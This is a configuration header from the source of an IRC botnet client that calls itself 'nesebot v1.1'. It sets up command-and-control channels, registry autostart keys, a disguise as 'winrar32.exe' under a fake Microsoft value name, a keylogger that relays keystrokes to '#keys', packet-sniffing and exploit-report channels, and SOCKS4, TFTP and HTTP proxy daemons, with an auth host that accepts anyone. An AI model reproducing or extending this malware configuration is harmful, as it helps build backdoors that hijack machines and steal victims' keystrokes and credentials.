//

// bot configuration (generic) - doesn't need to be encrypted
int port = 5111;				// server port
int port2 = 5111;				// backup server port
int socks4port = 12221;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

char botid[] = "fg60a";						// bot id
char password[] = "";					// bot password
char server[] = "";		// server
char serverpass[] = "";						// server password
char channel[] = "#pnptest";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "#pnptest";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "winrar32.exe";			// destination file name
char keylogfile[] = "wsgr32.dat";				// keylog filename
char valuename[] = "Microsoft PNPSecure";		// value name for autostart
char nickconst[] = "pnp";					// first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "-x+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#exploit";					// Channel where exploit messages get redirected
char psniffchan[] = "#sniff";				  // sniffing channel
char keylogchan[] = "#keys";						// Channel where keylog messages get redirected
char version[] = "[nesebot1.1r+ASN & PNP]";    // !bot version reply

char *authost[] = {
	"*@*",
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

// nesebot v1.1